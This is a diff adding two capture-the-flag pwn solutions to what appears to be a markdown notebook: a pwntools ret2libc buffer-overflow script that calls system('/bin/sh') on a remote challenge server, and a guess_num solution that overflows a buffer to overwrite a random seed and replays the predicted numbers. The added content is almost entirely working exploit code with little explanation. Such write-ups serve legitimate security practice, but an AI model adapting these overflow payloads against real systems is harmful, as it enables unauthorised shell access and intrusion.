@@ -70,7 +70,57 @@ p.sendline(pay)
 p.interactive()
 ```
 
+# level2
+
+```python
+from pwn import *
+
+p=remote('111.198.29.45',48633)
+
+elf=ELF('./level2-6')
+saddr=elf.symbols['system']
+binaddr=elf.search('/bin/sh').next()
+#saddr=0x8048320
+#binaddr=0x804a024
+
+pay='a'*(0x88+4)+p32(saddr)+'a'*4+p32(binaddr)
+p.recvuntil('Input:')
+p.sendline(pay)
+p.interactive()
+```
+
+# guess_num
+```cpp
+#include<cstdio>
+#include<cstring>
+#include<algorithm>
+int main(){
+	srand(1);
+	for(int i=0;i<=9;i++){
+		printf("%d ",rand()%6+1);
+	}
+	return 0;
+} 
+```
+```python
+from pwn import *
+
+p=remote('111.198.29.45',36870)
+
+pay='a'*(0x30-0x10)+p64(0)
+
+s='2 5 4 2 6 2 5 1 4 2'
+s=s.split(' ')
+
+p.recvuntil(':')
+p.sendline(pay)
+for i in range(10):
+    p.recvuntil(':')
+    p.sendline(s[i])
+
+p.interactive()
+```
 # 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTc0OTc5MzI4M119
+eyJoaXN0b3J5IjpbNjA1NDY3MTFdfQ==
 -->
